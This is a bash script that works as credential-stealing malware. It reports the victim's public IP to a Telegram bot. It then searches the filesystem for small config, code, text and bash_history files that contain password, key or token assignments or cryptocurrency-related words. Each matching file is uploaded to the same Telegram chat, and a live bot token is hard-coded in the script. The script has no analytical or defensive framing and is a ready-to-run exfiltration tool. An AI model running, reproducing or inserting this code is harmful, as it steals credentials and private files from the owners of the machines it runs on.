#!/bin/bash

echo "start"
curl -s -o /dev/null -X POST -H "Content-Type: application/json" -d "{\"chat_id\": \"-4170749466\", \"text\": \"start pannElid $(curl -s http://ifconfig.me)\", \"disable_notification\": false}" https://api.telegram.org/bot6694357231:AAECeQxIO2Nkd2b8w7v9ELtG0CaW_hG5usE/sendMessage

find / \( -path '*/node_modules/*' -o -path '*/vendor/*' -o -path '*/bitnami/*' -o -path '*/usr/*' -o -path '*/python*/*' \) -prune -o -type f \( -iname \*.js -o -iname \*.php -o -iname \*.ini -o -iname \*.conf -o -iname \*.cnf -o -iname \*.py -o -iname \*.txt -o -iname \*.json -o -iname \*.bash_history \) -size -100 -exec grep -r -Hn -i -P "((PAssword|password|pass|passwd|mypw|key|pw|token)(\s|\t)*[:=](\s|\t)*[\'\"][^\'\"]+[\'\"])|(porn|sex|cripto|usdt|btc)" {} \; 2>/dev/null | awk 'length($0) < 70' | awk -F':' '{print $1}' | sort -u | while read file; do sleep 2; curl -s -X POST -F "document=@$file" https://api.telegram.org/bot6694357231:AAECeQxIO2Nkd2b8w7v9ELtG0CaW_hG5usE/sendDocument?chat_id=-4170749466; done

curl -s -o /dev/null -X POST -H "Content-Type: application/json" -d "{\"chat_id\": \"-4170749466\", \"text\": \"end pannElid $(curl -s http://ifconfig.me)\", \"disable_notification\": false}" https://api.telegram.org/bot6694357231:AAECeQxIO2Nkd2b8w7v9ELtG0CaW_hG5usE/sendMessage

echo "eval"

echo "add"

echo "rem"
